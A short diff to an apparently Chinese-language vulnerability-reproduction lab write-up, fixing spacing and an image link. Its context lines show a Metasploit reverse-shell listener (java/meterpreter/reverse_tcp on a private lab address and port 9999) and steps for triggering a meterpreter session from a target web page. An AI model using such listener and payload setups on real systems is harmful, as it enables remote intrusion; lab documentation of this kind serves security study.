@@ -27,13 +27,14 @@ use exploit/multi/handler
 set payload java/meterpreter/reverse_tcp  
 set lhost 172.16.35.128  
 set lport 9999  
-run  
+run
+
 浏览器访问http://172.16.35.131:8081/ 后点击下图所示  
 ![image](./2.png)  
 再点击下图所示  
 ![image](./3.png)  
 此时，meterpreter已经收到session，如下图  
-![image](./3.png)
+![image](./4.png)
 
 # 0x05 踩坑记录
 无
